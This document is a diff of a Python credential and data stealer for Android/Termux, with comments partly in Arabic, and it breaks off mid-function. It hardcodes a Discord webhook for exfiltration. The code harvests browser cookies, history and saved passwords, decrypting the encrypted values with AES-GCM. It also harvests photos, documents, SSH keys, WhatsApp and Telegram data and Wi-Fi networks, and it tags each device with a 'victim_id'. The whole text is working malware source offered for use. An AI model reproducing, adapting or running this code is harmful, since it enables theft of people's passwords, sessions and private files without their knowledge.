@@ -2,11 +2,11 @@
 # -*- coding: utf-8 -*-
 # ╔══════════════════════════════════════════════════════════╗
 # ║                M1 EZ HAING NOW  PH                       ║
-# ║            TERMUX NUCLEAR PREDATOR v7.0                  ║
-# ║        ULTIMATE DATA HARVESTER - EVERYTHING             ║
+# ║            GHOST PROTOCOL - TERMUX EDITION              ║
+# ║        FULL WINDOWS POWER ON ANDROID                    ║
 # ╚══════════════════════════════════════════════════════════╝
 
-# ════════ WEBHOOK - PUT YOUR WORKING WEBHOOK HERE ════════
+# ════════ WEBHOOK - PUT YOUR DISCORD WEBHOOK HERE ════════
 WEBHOOK_URL = "https://discord.com/api/webhooks/1427133756724084817/uVvQRILIYlg7ku1ZEfPJ69BpS1-WjRFwdyhBt7vbyLB_514MbGcaWPGnPft1riDqm7O0"
 
 import os
@@ -21,1150 +21,678 @@ import urllib.request
 import urllib.error
 import ssl
 import sqlite3
+import hashlib
+import base64
+import re
+from datetime import datetime
 import zipfile
 import io
-import shutil
-import hashlib
-from datetime import datetime
-from pathlib import Path
-import mimetypes
+import threading
 
-# ════════ CONFIGURATION ════════
-ssl._create_default_https_context = ssl._create_unverified_context
-VICTIM_ID = hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12]
-
-# ════════ ANDROID BROWSER PATHS ════════
-ANDROID_BROWSER_PATHS = {
-    'chrome': [
-        '/data/data/com.android.chrome/app_chrome/Default',
-        '/data/data/com.android.chrome/files',
-        '/data/data/com.chrome.beta/app_chrome/Default'
-    ],
-    'firefox': [
-        '/data/data/org.mozilla.firefox/files/mozilla',
-        '/data/data/org.mozilla.firefox'
-    ],
-    'opera': [
-        '/data/data/com.opera.browser/app_opera'
-    ],
-    'samsung': [
-        '/data/data/com.sec.android.app.sbrowser'
-    ],
-    'uc': [
-        '/data/data/com.UCMobile/files/UCBrowser'
-    ]
+# ════════ ANDROID PATHS INSTEAD OF WINDOWS ════════
+LOCAL = "/data/data/com.termux/files/home"
+ROAMING = "/data/data/com.termux/files/home"
+ANDROID_PATHS = {
+    'Chrome': '/data/data/com.android.chrome/app_chrome/Default',
+    'Firefox': '/data/data/org.mozilla.firefox/files/mozilla',
+    'Opera': '/data/data/com.opera.browser/app_opera',
+    'Edge': '/data/data/com.microsoft.emmx/files',
+    'Brave': '/data/data/com.brave.browser/files',
+    'Samsung': '/data/data/com.sec.android.app.sbrowser',
+    'UC': '/data/data/com.UCMobile/files'
 }
 
-# ════════ FILE TYPES TO HARVEST ════════
-TARGET_EXTENSIONS = {
-    'images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'],
-    'videos': ['.mp4', '.avi', '.mov', '.mkv', '.flv', '.wmv'],
-    'documents': ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt'],
-    'databases': ['.db', '.sqlite', '.sqlite3', '.mdb'],
-    'configs': ['.conf', '.config', '.cfg', '.ini', '.json', '.xml', '.yml', '.yaml'],
-    'archives': ['.zip', '.rar', '.7z', '.tar', '.gz'],
-    'logs': ['.log', '.txt']
-}
-
-# ════════ ULTIMATE FILE HARVESTER ════════
-class NuclearHarvester:
-    def __init__(self):
-        self.harvested_files = []
-        self.total_size = 0
-        self.webhook = WEBHOOK_URL
-        
-    def harvest_everything(self):
-        """Harvest EVERYTHING from the device"""
-        print("\n" + "💀"*70)
-        print("💀 NUCLEAR HARVEST INITIATED - COLLECTING EVERYTHING")
-        print("💀"*70)
-        
-        all_data = {
-            "victim_id": VICTIM_ID,
-            "timestamp": datetime.now().isoformat(),
-            "operator": "M1 EZ HAING NOW PH",
-            "system_info": self.get_system_intel(),
-            "browser_data": self.harvest_browser_data(),
-            "media_files": self.harvest_media_files(),
-            "documents": self.harvest_documents(),
-            "passwords": self.harvest_passwords(),
-            "cookies": self.harvest_cookies(),
-            "search_history": self.harvest_search_history(),
-            "whatsapp_data": self.harvest_whatsapp_data(),
-            "telegram_data": self.harvest_telegram_data(),
-            "sensitive_files": self.find_sensitive_files(),
-            "network_data": self.get_network_intel(),
-            "storage_analysis": self.analyze_storage(),
-            "installed_apps": self.get_installed_apps(),
-            "screenshot_data": self.harvest_screenshots()
-        }
-        
-        # Create ZIP with everything
-        zip_buffer = self.create_mega_zip(all_data)
-        
-        # Send to Discord
-        self.send_nuclear_payload(all_data, zip_buffer)
-        
-        return all_data
+# ════════ ANDROID-SPECIFIC CRYPTO (بديل win32crypt) ════════
+class AndroidCrypto:
+    """بديل لـ win32crypt للـ Android"""
     
-    def get_system_intel(self):
-        """Get complete system intelligence"""
-        print("\n[1] 🖥️  COLLECTING SYSTEM INTELLIGENCE...")
-        
-        intel = {
-            "device_id": VICTIM_ID,
-            "collection_time": datetime.now().isoformat(),
-            "basic_info": {
-                "hostname": socket.gethostname(),
-                "username": getpass.getuser(),
-                "platform": platform.platform(),
-                "system": platform.system(),
-                "release": platform.release(),
-                "machine": platform.machine(),
-                "processor": platform.processor(),
-                "python_version": platform.python_version()
-            },
-            "android_info": self.get_android_info(),
-            "storage_info": self.get_storage_info(),
-            "network_info": self.get_network_info(),
-            "process_info": self.get_process_info(),
-            "installed_packages": self.get_installed_packages(),
-            "hacking_tools": self.detect_hacking_tools(),
-            "termux_info": self.get_termux_info()
-        }
-        
-        print(f"    ✅ System Intel: {len(json.dumps(intel)):,} bytes")
-        return intel
+    @staticmethod
+    def decrypt_chrome_value(encrypted_value, key=None):
+        """محاكاة لـ CryptUnprotectData ولكن لـ Android"""
+        try:
+            # Chrome على Android يستخدم AES-GCM
+            if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
+                # تخطي header (v10 أو v11)
+                encrypted_value = encrypted_value[3:]
+                
+                # استخراج iv (12 bytes)
+                iv = encrypted_value[:12]
+                ciphertext = encrypted_value[12:-16]
+                tag = encrypted_value[-16:]
+                
+                # إذا عندنا key (من Local State)
+                if key:
+                    from Crypto.Cipher import AES
+                    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+                    decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                    return decrypted.decode('utf-8', errors='ignore')
+            
+            return "DECRYPTION_FAILED"
+        except:
+            return "ENCRYPTED_VALUE"
     
-    def get_android_info(self):
-        """Get Android-specific information"""
-        info = {}
-        
-        # Check Android version
-        android_version = "Unknown"
+    @staticmethod
+    def extract_chrome_key():
+        """استخراج Chrome encryption key من Android"""
         try:
-            if os.path.exists('/system/build.prop'):
-                with open('/system/build.prop', 'r') as f:
-                    content = f.read()
-                    for line in content.split('\n'):
-                        if 'ro.build.version.release' in line:
-                            android_version = line.split('=')[1].strip()
-                            break
-        except:
-            pass
-        
-        info['android_version'] = android_version
-        info['is_rooted'] = os.path.exists('/system/xbin/su') or os.path.exists('/system/bin/su')
-        info['has_termux'] = os.path.exists('/data/data/com.termux')
-        info['sdcard_access'] = os.path.exists('/sdcard')
-        
-        # Get device model
-        try:
-            if os.path.exists('/system/build.prop'):
-                with open('/system/build.prop', 'r') as f:
-                    content = f.read()
-                    for line in content.split('\n'):
-                        if 'ro.product.model' in line:
-                            info['device_model'] = line.split('=')[1].strip()
-                            break
-                        elif 'ro.product.manufacturer' in line:
-                            info['manufacturer'] = line.split('=')[1].strip()
-        except:
-            pass
-        
-        return info
-    
-    def get_storage_info(self):
-        """Get detailed storage information"""
-        storage = {}
-        
-        # Android storage paths
-        storage_paths = [
-            ('/', 'Root'),
-            ('/sdcard', 'External Storage'),
-            ('/storage/emulated/0', 'Internal Storage'),
-            ('/data/data/com.termux/files/home', 'Termux Home'),
-            ('/system', 'System'),
-            ('/data', 'Data Partition')
-        ]
-        
-        for path, name in storage_paths:
-            if os.path.exists(path):
-                try:
-                    usage = shutil.disk_usage(path)
-                    storage[name] = {
-                        'path': path,
-                        'total_gb': usage.total // (1024**3),
-                        'used_gb': usage.used // (1024**3),
-                        'free_gb': usage.free // (1024**3),
-                        'free_percent': (usage.free / usage.total * 100) if usage.total > 0 else 0
-                    }
-                except:
-                    storage[name] = {'path': path, 'status': 'access_denied'}
-        
-        return storage
-    
-    def get_network_info(self):
-        """Get comprehensive network information"""
-        network = {}
-        
-        # Public IP
-        try:
-            network['public_ip'] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
-        except:
-            network['public_ip'] = "Unknown"
-        
-        # Network interfaces
-        try:
-            result = subprocess.run("ip addr show", shell=True, capture_output=True, text=True, timeout=5)
-            if result.stdout:
-                network['interfaces'] = result.stdout.strip().split('\n')[:30]
-        except:
-            pass
-        
-        # WiFi info
-        try:
-            wifi_files = [
-                '/data/misc/wifi/wpa_supplicant.conf',
-                '/data/misc/wifi/WifiConfigStore.xml'
+            # مسارات ممكنة للـ Local State
+            possible_paths = [
+                '/data/data/com.android.chrome/app_chrome/Local State',
+                '/data/data/com.android.chrome/files/Local State',
+                '/data/user/0/com.android.chrome/app_chrome/Local State'
             ]
             
-            wifi_networks = []
-            for wifi_file in wifi_files:
-                if os.path.exists(wifi_file):
-                    try:
-                        with open(wifi_file, 'r', errors='ignore') as f:
-                            content = f.read()
-                            # Extract SSIDs
-                            import re
-                            ssids = re.findall(r'ssid="([^"]+)"', content)
-                            wifi_networks.extend(ssids)
-                    except:
-                        pass
-            
-            network['wifi_networks'] = list(set(wifi_networks))[:20]
-        except:
-            pass
-        
-        return network
-    
-    def harvest_browser_data(self):
-        """Harvest ALL browser data"""
-        print("\n[2] 🌐 HARVESTING BROWSER DATA...")
-        
-        browser_data = {}
-        
-        for browser, paths in ANDROID_BROWSER_PATHS.items():
-            browser_data[browser] = {
-                'found': False,
-                'cookies': [],
-                'passwords': [],
-                'history': [],
-                'bookmarks': [],
-                'downloads': [],
-                'cache': []
-            }
-            
-            for path in paths:
+            for path in possible_paths:
                 if os.path.exists(path):
-                    browser_data[browser]['found'] = True
-                    browser_data[browser]['path'] = path
-                    
-                    # Look for databases
-                    try:
-                        for root, dirs, files in os.walk(path):
-                            for file in files:
-                                if file.endswith(('.db', '.sqlite')):
-                                    db_path = os.path.join(root, file)
-                                    
-                                    # Check what type of database
-                                    db_name = file.lower()
-                                    if 'cookies' in db_name:
-                                        browser_data[browser]['cookies'].append(db_path)
-                                    elif 'web data' in db_name or 'password' in db_name:
-                                        browser_data[browser]['passwords'].append(db_path)
-                                    elif 'history' in db_name:
-                                        browser_data[browser]['history'].append(db_path)
-                                    elif 'bookmark' in db_name:
-                                        browser_data[browser]['bookmarks'].append(db_path)
-                                    elif 'download' in db_name:
-                                        browser_data[browser]['downloads'].append(db_path)
-                    except:
-                        pass
-        
-        # Try to extract actual data from databases
-        for browser in browser_data:
-            if browser_data[browser]['found']:
-                self.extract_browser_info(browser_data[browser])
-        
-        print(f"    ✅ Browser Data Harvested")
-        return browser_data
-    
-    def extract_browser_info(self, browser_info):
-        """Extract actual data from browser databases"""
-        try:
-            # Extract from cookies database
-            for cookie_db in browser_info['cookies'][:3]:  # Limit to 3 dbs
-                try:
-                    conn = sqlite3.connect(cookie_db)
-                    cursor = conn.cursor()
-                    
-                    # Get cookies
-                    cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 50")
-                    cookies = cursor.fetchall()
-                    browser_info['cookies_data'] = [{'host': c[0], 'name': c[1], 'value': c[2][:50]} for c in cookies[:20]]
-                    
-                    conn.close()
-                except:
-                    pass
-            
-            # Extract from history database
-            for history_db in browser_info['history'][:2]:
-                try:
-                    conn = sqlite3.connect(history_db)
-                    cursor = conn.cursor()
-                    
-                    # Get last 50 searches
-                    cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
-                    history = cursor.fetchall()
-                    browser_info['history_data'] = [{'url': h[0], 'title': h[1]} for h in history[:20]]
-                    
-                    conn.close()
-                except:
-                    pass
-                    
-        except Exception as e:
-            browser_info['extraction_error'] = str(e)
-    
-    def harvest_media_files(self):
-        """Harvest photos and videos"""
-        print("\n[3] 📸 HARVESTING MEDIA FILES...")
-        
-        media = {
-            'photos': [],
-            'videos': [],
-            'screenshots': [],
-            'camera_photos': []
-        }
-        
-        # Common media directories on Android
-        media_dirs = [
-            '/sdcard/DCIM/Camera',
-            '/sdcard/DCIM/Screenshots',
-            '/sdcard/Pictures',
-            '/sdcard/Download',
-            '/sdcard/Movies',
-            '/storage/emulated/0/DCIM/Camera',
-            '/storage/emulated/0/Pictures',
-            '/sdcard/WhatsApp/Media',
-            '/sdcard/Telegram/Telegram Images',
-            '/sdcard/Instagram'
-        ]
-        
-        photo_count = 0
-        video_count = 0
-        
-        for media_dir in media_dirs:
-            if os.path.exists(media_dir):
-                try:
-                    for root, dirs, files in os.walk(media_dir):
-                        for file in files:
-                            file_path = os.path.join(root, file)
-                            file_lower = file.lower()
-                            
-                            # Check file type
-                            if any(file_lower.endswith(ext) for ext in TARGET_EXTENSIONS['images']):
-                                if photo_count < 100:  # Limit to 100 photos
-                                    try:
-                                        size = os.path.getsize(file_path)
-                                        if size < 10 * 1024 * 1024:  # 10MB limit
-                                            media['photos'].append({
-                                                'path': file_path,
-                                                'name': file,
-                                                'size_mb': size // (1024 * 1024),
-                                                'modified': datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
-                                            })
-                                            photo_count += 1
-                                            self.harvested_files.append(file_path)
-                                            self.total_size += size
-                                    except:
-                                        pass
-                            
-                            elif any(file_lower.endswith(ext) for ext in TARGET_EXTENSIONS['videos']):
-                                if video_count < 50:  # Limit to 50 videos
-                                    try:
-                                        size = os.path.getsize(file_path)
-                                        if size < 20 * 1024 * 1024:  # 20MB limit
-                                            media['videos'].append({
-                                                'path': file_path,
-                                                'name': file,
-                                                'size_mb': size // (1024 * 1024),
-                                                'modified': datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
-                                            })
-                                            video_count += 1
-                                            self.harvested_files.append(file_path)
-                                            self.total_size += size
-                                    except:
-                                        pass
-                                    
-                        if photo_count >= 100 and video_count >= 50:
-                            break
-                except:
-                    pass
-        
-        media['photo_count'] = photo_count
-        media['video_count'] = video_count
-        
-        print(f"    ✅ Media: {photo_count} photos, {video_count} videos")
-        return media
-    
-    def harvest_documents(self):
-        """Harvest documents"""
-        print("\n[4] 📄 HARVESTING DOCUMENTS...")
-        
-        documents = []
-        doc_dirs = [
-            '/sdcard/Download',
-            '/sdcard/Documents',
-            '/sdcard/WhatsApp/Media/WhatsApp Documents',
-            '/storage/emulated/0/Download'
-        ]
-        
-        doc_count = 0
-        
-        for doc_dir in doc_dirs:
-            if os.path.exists(doc_dir):
-                try:
-                    for root, dirs, files in os.walk(doc_dir):
-                        for file in files:
-                            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS['documents']):
-                                if doc_count < 50:  # Limit to 50 documents
-                                    file_path = os.path.join(root, file)
-                                    try:
-                                        size = os.path.getsize(file_path)
-                                        if size < 5 * 1024 * 1024:  # 5MB limit
-                                            documents.append({
-                                                'path': file_path,
-                                                'name': file,
-                                                'size_mb': size // (1024 * 1024),
-                                                'type': file.split('.')[-1].upper()
-                                            })
-                                            doc_count += 1
-                                            self.harvested_files.append(file_path)
-                                            self.total_size += size
-                                    except:
-                                        pass
-                except:
-                    pass
-        
-        print(f"    ✅ Documents: {doc_count} files")
-        return documents
-    
-    def harvest_passwords(self):
-        """Harvest password files"""
-        print("\n[5] 🔐 HARVESTING PASSWORD FILES...")
-        
-        passwords = {
-            'ssh_keys': [],
-            'password_files': [],
-            'config_files': [],
-            'database_files': []
-        }
-        
-        # Find SSH keys
-        try:
-            result = subprocess.run(
-                "find /sdcard /data -name 'id_rsa' -o -name 'id_dsa' -o -name '*.pem' 2>/dev/null | head -10",
-                shell=True, capture_output=True, text=True
-            )
-            if result.stdout:
-                passwords['ssh_keys'] = [line.strip() for line in result.stdout.strip().split('\n') if line]
+                    with open(path, 'r') as f:
+                        local_state = json.load(f)
+                        encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
+                        
+                        if encrypted_key:
+                            # قاعدة64 decode
+                            encrypted_key = base64.b64decode(encrypted_key)
+                            # إزالة prefix 'DPAPI' (5 bytes)
+                            encrypted_key = encrypted_key[5:]
+                            return encrypted_key
         except:
             pass
-        
-        # Find password files
-        search_terms = ['password', 'passwd', 'secret', 'key', 'token', 'credential', 'login']
-        for term in search_terms:
+        return None
+
+# ════════ ANDROID-SPECIFIC FUNCTIONS ════════
+def get_android_system_info():
+    """بديل لـ Windows system info"""
+    info = {
+        'device_id': hashlib.md5(f"{socket.gethostname()}{int(time.time())}".encode()).hexdigest()[:12],
+        'device_name': socket.gethostname(),
+        'username': getpass.getuser(),
+        'platform': platform.platform(),
+        'android_version': get_android_version(),
+        'is_rooted': check_root(),
+        'storage': get_android_storage(),
+        'network': get_android_network(),
+        'installed_apps': get_installed_apps(),
+        'processes': get_running_processes()
+    }
+    return info
+
+def get_android_version():
+    """الحصول على إصدار Android"""
+    try:
+        if os.path.exists('/system/build.prop'):
+            with open('/system/build.prop', 'r') as f:
+                content = f.read()
+                for line in content.split('\n'):
+                    if 'ro.build.version.release' in line:
+                        return line.split('=')[1].strip()
+    except:
+        pass
+    return "Unknown"
+
+def check_root():
+    """التحقق إذا الجهاز rooted"""
+    root_indicators = [
+        '/system/xbin/su',
+        '/system/bin/su',
+        '/sbin/su',
+        '/data/local/bin/su',
+        '/data/local/xbin/su'
+    ]
+    return any(os.path.exists(path) for path in root_indicators)
+
+def get_android_storage():
+    """معلومات التخزين في Android"""
+    storage_info = {}
+    
+    storage_paths = [
+        ('/', 'Root'),
+        ('/sdcard', 'External Storage'),
+        ('/storage/emulated/0', 'Internal Storage'),
+        ('/data/data/com.termux/files/home', 'Termux Home')
+    ]
+    
+    import shutil
+    for path, name in storage_paths:
+        if os.path.exists(path):
             try:
-                cmd = f"grep -r -i '{term}' /sdcard/Download /sdcard/Documents 2>/dev/null | head -5"
-                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-                if result.stdout:
-                    lines = result.stdout.strip().split('\n')
-                    passwords['password_files'].extend(lines[:3])
+                usage = shutil.disk_usage(path)
+                storage_info[name] = {
+                    'total_gb': usage.total // (1024**3),
+                    'free_gb': usage.free // (1024**3),
+                    'used_gb': usage.used // (1024**3)
+                }
             except:
                 pass
-        
-        print(f"    ✅ Password Files: {len(passwords['ssh_keys'])} SSH keys")
-        return passwords
     
-    def harvest_cookies(self):
-        """Harvest cookies from browsers"""
-        print("\n[6] 🍪 HARVESTING COOKIES...")
-        
-        cookies = []
-        
-        # Look for cookie databases
-        cookie_patterns = ['Cookies', 'cookies.db', 'webviewCookies']
-        
-        for pattern in cookie_patterns:
+    return storage_info
+
+def get_android_network():
+    """معلومات الشبكة في Android"""
+    network_info = {}
+    
+    # IP العام
+    try:
+        network_info['public_ip'] = urllib.request.urlopen("https://api.ipify.org").read().decode()
+    except:
+        network_info['public_ip'] = "Unknown"
+    
+    # معلومات WiFi
+    network_info['wifi'] = get_wifi_info_android()
+    
+    return network_info
+
+def get_wifi_info_android():
+    """الحصول على معلومات WiFi في Android"""
+    wifi_info = []
+    
+    # محاولة قراءة ملفات WiFi
+    wifi_files = [
+        '/data/misc/wifi/wpa_supplicant.conf',
+        '/data/misc/wifi/WifiConfigStore.xml'
+    ]
+    
+    for wifi_file in wifi_files:
+        if os.path.exists(wifi_file):
             try:
-                cmd = f"find /data -name '*{pattern}*' 2>/dev/null | head -5"
-                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-                if result.stdout:
-                    db_files = [line.strip() for line in result.stdout.strip().split('\n') if line]
-                    
-                    for db_file in db_files[:3]:  # Check first 3 databases
-                        try:
-                            conn = sqlite3.connect(db_file)
-                            cursor = conn.cursor()
-                            
-                            # Try to get cookies
-                            try:
-                                cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 20")
-                                cookie_data = cursor.fetchall()
-                                
-                                for cookie in cookie_data:
-                                    cookies.append({
-                                        'domain': cookie[0],
-                                        'name': cookie[1],
-                                        'value': cookie[2][:100] if cookie[2] else ''
-                                    })
-                            except:
-                                pass
-                            
-                            conn.close()
-                        except:
-                            pass
+                with open(wifi_file, 'r', errors='ignore') as f:
+                    content = f.read()
+                    # استخراج SSIDs
+                    ssids = re.findall(r'ssid="([^"]+)"', content)
+                    wifi_info.extend(ssids)
             except:
                 pass
-        
-        print(f"    ✅ Cookies: {len(cookies)} found")
-        return cookies[:50]  # Limit to 50 cookies
     
-    def harvest_search_history(self):
-        """Harvest search history"""
-        print("\n[7] 🔍 HARVESTING SEARCH HISTORY...")
-        
-        search_history = []
-        
-        # Browser history databases
-        history_patterns = ['History', 'browser.db', 'webview.db']
-        
-        for pattern in history_patterns:
-            try:
-                cmd = f"find /data -name '*{pattern}*' 2>/dev/null | head -3"
-                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-                if result.stdout:
-                    db_files = [line.strip() for line in result.stdout.strip().split('\n') if line]
-                    
-                    for db_file in db_files:
-                        try:
-                            conn = sqlite3.connect(db_file)
-                            cursor = conn.cursor()
-                            
-                            # Try different table names
-                            tables = ['urls', 'history', 'searches', 'search_history']
-                            
-                            for table in tables:
-                                try:
-                                    cursor.execute(f"SELECT url, title, last_visit_time FROM {table} ORDER BY last_visit_time DESC LIMIT 50")
-                                    history = cursor.fetchall()
-                                    
-                                    for entry in history:
-                                        if 'google.com/search' in entry[0] or 'search' in entry[0].lower():
-                                            search_history.append({
-                                                'query': entry[1] if entry[1] else entry[0],
-                                                'url': entry[0],
-                                                'timestamp': entry[2] if len(entry) > 2 else 'N/A'
-                                            })
-                                            
-                                            if len(search_history) >= 50:
-                                                break
-                                except:
-                                    pass
-                                
-                            conn.close()
-                        except:
-                            pass
-            except:
-                pass
-        
-        print(f"    ✅ Search History: {len(search_history)} entries")
-        return search_history[:50]
+    return list(set(wifi_info))[:10]  # أول 10 شبكات
+
+def get_installed_apps():
+    """الحصول على التطبيقات المثبتة"""
+    apps = []
     
-    def harvest_whatsapp_data(self):
-        """Harvest WhatsApp data"""
-        print("\n[8] 💚 HARVESTING WHATSAPP DATA...")
-        
-        whatsapp = {
-            'found': False,
-            'databases': [],
-            'media': [],
-            'backups': []
-        }
-        
-        whatsapp_paths = [
-            '/sdcard/WhatsApp',
-            '/storage/emulated/0/WhatsApp',
-            '/data/data/com.whatsapp'
-        ]
-        
-        for path in whatsapp_paths:
-            if os.path.exists(path):
-                whatsapp['found'] = True
-                whatsapp['path'] = path
-                
-                # Find databases
-                try:
-                    for root, dirs, files in os.walk(path):
-                        for file in files:
-                            if file.endswith('.db'):
-                                whatsapp['databases'].append(os.path.join(root, file))
-                        break
-                except:
-                    pass
-        
-        print(f"    ✅ WhatsApp: {'Found' if whatsapp['found'] else 'Not found'}")
-        return whatsapp
+    # حزم Termux
+    try:
+        result = subprocess.run("apt list --installed 2>/dev/null | head -30", 
+                              shell=True, capture_output=True, text=True)
+        if result.stdout:
+            packages = result.stdout.strip().split('\n')[1:]
+            apps.extend(packages[:20])
+    except:
+        pass
     
-    def harvest_telegram_data(self):
-        """Harvest Telegram data"""
-        print("\n[9] 💙 HARVESTING TELEGRAM DATA...")
-        
-        telegram = {
-            'found': False,
-            'databases': [],
-            'cache': []
-        }
-        
-        telegram_paths = [
-            '/sdcard/Telegram',
-            '/storage/emulated/0/Telegram',
-            '/data/data/org.telegram.messenger'
-        ]
-        
-        for path in telegram_paths:
-            if os.path.exists(path):
-                telegram['found'] = True
-                telegram['path'] = path
-                
-                # Find cache and data
-                try:
-                    cache_path = os.path.join(path, 'Telegram Images')
-                    if os.path.exists(cache_path):
-                        telegram['cache'].append(cache_path)
-                except:
-                    pass
-        
-        print(f"    ✅ Telegram: {'Found' if telegram['found'] else 'Not found'}")
-        return telegram
-    
-    def find_sensitive_files(self):
-        """Find sensitive files"""
-        print("\n[10] 🔓 FINDING SENSITIVE FILES...")
-        
-        sensitive = {
-            'database_files': [],
-            'config_files': [],
-            'backup_files': [],
-            'log_files': []
-        }
-        
-        # Search in common locations
-        search_locations = ['/sdcard', '/storage/emulated/0', '/data/data/com.termux/files/home']
-        
-        for location in search_locations:
-            if os.path.exists(location):
-                # Database files
-                try:
-                    cmd = f"find {location} -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null | head -10"
-                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-                    if result.stdout:
-                        sensitive['database_files'].extend([line.strip() for line in result.stdout.strip().split('\n') if line])
-                except:
-                    pass
-                
-                # Config files
-                for ext in TARGET_EXTENSIONS['configs']:
-                    try:
-                        cmd = f"find {location} -name '*{ext}' 2>/dev/null | head -5"
-                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-                        if result.stdout:
-                            sensitive['config_files'].extend([line.strip() for line in result.stdout.strip().split('\n') if line])
-                    except:
-                        pass
-        
-        print(f"    ✅ Sensitive Files: {len(sensitive['database_files'])} databases")
-        return sensitive
-    
-    def get_process_info(self):
-        """Get running process information"""
+    # أدوات Android (إذا rooted)
+    if check_root():
         try:
-            result = subprocess.run("ps aux", shell=True, capture_output=True, text=True, timeout=5)
-            if result.stdout:
-                processes = result.stdout.strip().split('\n')[:20]
-                return processes
-        except:
-            pass
-        return []
-    
-    def get_installed_packages(self):
-        """Get installed packages"""
-        packages = []
-        try:
-            result = subprocess.run("apt list --installed 2>/dev/null | head -50", 
+            result = subprocess.run("pm list packages 2>/dev/null | head -30", 
                                   shell=True, capture_output=True, text=True)
             if result.stdout:
-                packages = result.stdout.strip().split('\n')[1:40]
+                android_apps = result.stdout.strip().split('\n')
+                apps.extend([pkg.replace('package:', '') for pkg in android_apps[:20]])
         except:
             pass
-        return packages
     
-    def detect_hacking_tools(self):
-        """Detect hacking tools"""
-        tools = []
-        hacking_tools = [
-            'nmap', 'sqlmap', 'hydra', 'metasploit', 'aircrack-ng',
-            'john', 'hashcat', 'wireshark', 'adb', 'python3',
-            'php', 'git', 'curl', 'wget', 'netcat', 'tcpdump',
-            'binwalk', 'steghide', 'strings', 'radare2'
-        ]
+    return apps
+
+def get_running_processes():
+    """الحصول على العمليات النشطة"""
+    processes = []
+    try:
+        result = subprocess.run("ps aux 2>/dev/null | head -20", 
+                              shell=True, capture_output=True, text=True)
+        if result.stdout:
+            processes = result.stdout.strip().split('\n')
+    except:
+        pass
+    return processes
+
+# ════════ BROWSER DATA EXTRACTION FOR ANDROID ════════
+def extract_android_browser_data():
+    """استخراج بيانات المتصفحات في Android"""
+    all_browser_data = {
+        'cookies': [],
+        'passwords': [],
+        'history': [],
+        'bookmarks': []
+    }
+    
+    for browser_name, browser_path in ANDROID_PATHS.items():
+        if os.path.exists(browser_path):
+            browser_data = extract_single_browser(browser_name, browser_path)
+            
+            all_browser_data['cookies'].extend(browser_data.get('cookies', []))
+            all_browser_data['passwords'].extend(browser_data.get('passwords', []))
+            all_browser_data['history'].extend(browser_data.get('history', []))
+            all_browser_data['bookmarks'].extend(browser_data.get('bookmarks', []))
+    
+    return all_browser_data
+
+def extract_single_browser(browser_name, browser_path):
+    """استخراج بيانات متصفح واحد"""
+    browser_data = {
+        'cookies': [],
+        'passwords': [],
+        'history': [],
+        'bookmarks': []
+    }
+    
+    try:
+        # البحث عن ملفات SQLite
+        for root, dirs, files in os.walk(browser_path):
+            for file in files:
+                if file.endswith('.db') or file.endswith('.sqlite'):
+                    db_path = os.path.join(root, file)
+                    
+                    # تحديد نوع الداتابيس
+                    if 'cookie' in file.lower():
+                        cookies = extract_cookies_from_db(browser_name, db_path)
+                        browser_data['cookies'].extend(cookies)
+                    
+                    elif 'web data' in file.lower() or 'login' in file.lower():
+                        passwords = extract_passwords_from_db(browser_name, db_path)
+                        browser_data['passwords'].extend(passwords)
+                    
+                    elif 'history' in file.lower():
+                        history = extract_history_from_db(browser_name, db_path)
+                        browser_data['history'].extend(history)
+                    
+                    elif 'bookmark' in file.lower():
+                        bookmarks = extract_bookmarks_from_db(browser_name, db_path)
+                        browser_data['bookmarks'].extend(bookmarks)
+    except:
+        pass
+    
+    return browser_data
+
+def extract_cookies_from_db(browser_name, db_path):
+    """استخراج الكوكيز من الداتابيس"""
+    cookies = []
+    
+    try:
+        temp_db = f"/data/data/com.termux/files/home/tmp_{int(time.time())}.db"
+        subprocess.run(f"cp '{db_path}' '{temp_db}'", shell=True)
         
-        for tool in hacking_tools:
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # محاولة جداول مختلفة
+        tables = ['cookies', 'moz_cookies', 'android_metadata']
+        
+        for table in tables:
             try:
-                result = subprocess.run(f"which {tool} 2>/dev/null", 
-                                      shell=True, capture_output=True, text=True)
-                if result.returncode == 0:
-                    tools.append(tool)
+                cursor.execute(f"SELECT host_key, name, encrypted_value FROM {table} LIMIT 20")
+                rows = cursor.fetchall()
+                
+                for host, name, encrypted in rows:
+                    if host and name:
+                        # محاولة فك التشفير
+                        decrypted = AndroidCrypto.decrypt_chrome_value(encrypted)
+                        cookies.append(f"[{browser_name}] {host} | {name} = {decrypted[:50]}")
+            except:
+                continue
+        
+        conn.close()
+        os.remove(temp_db)
+    except:
+        pass
+    
+    return cookies
+
+def extract_passwords_from_db(browser_name, db_path):
+    """استخراج الباسوردات من الداتابيس"""
+    passwords = []
+    
+    try:
+        temp_db = f"/data/data/com.termux/files/home/tmp_pass_{int(time.time())}.db"
+        subprocess.run(f"cp '{db_path}' '{temp_db}'", shell=True)
+        
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        
+        # محاولة جداول logins
+        try:
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 20")
+            rows = cursor.fetchall()
+            
+            for url, username, encrypted in rows:
+                if url and username:
+                    decrypted = AndroidCrypto.decrypt_chrome_value(encrypted)
